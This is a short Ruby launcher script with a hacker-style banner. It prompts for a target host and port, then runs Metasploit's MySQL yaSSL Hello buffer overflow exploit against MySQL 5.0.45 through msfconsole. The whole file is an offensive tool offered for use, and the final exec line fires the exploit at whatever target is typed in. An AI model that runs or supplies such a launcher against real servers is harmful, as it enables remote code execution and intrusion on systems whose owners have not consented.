require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
      MySQL yaSSL SSL Hello Message Buffer Overflow
		MySQL 5.0.45-Debian_1ubuntu3.1-log

		     Automatic::Linux
         
""".red
puts """
	 1st Try {set RPORT 3306; 2nd RPORT 80}""".white


puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp







exec("msfconsole -x 'use exploit/linux/mysql/mysql_yassl_hello' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run'")

